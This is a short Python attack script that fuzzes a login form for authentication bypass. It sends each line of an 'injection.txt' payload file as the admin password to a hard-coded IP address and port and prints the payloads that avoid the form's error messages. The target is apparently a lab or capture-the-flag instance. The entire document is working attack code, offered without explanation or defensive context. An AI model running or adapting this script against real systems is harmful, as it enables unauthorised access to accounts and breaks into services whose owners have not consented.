import requests
import re

url = "http://88.198.219.20:25344/"
Headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://88.198.219.20:25344/", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
Payloads = open('injection.txt','r')

for payload in Payloads:
    payload = payload.strip()
    Data = {"username": "admin", "password": payload}
    success = requests.post(url, headers=Headers, data=Data)
    error1 = re.findall('Incorrect login', success.text)
    error2 = re.findall('Attempting to login as more than one user!??', success.text)
    if len(error1) == 0 and len(error2) == 0:
        if success.status_code == 200:
            print(payload)

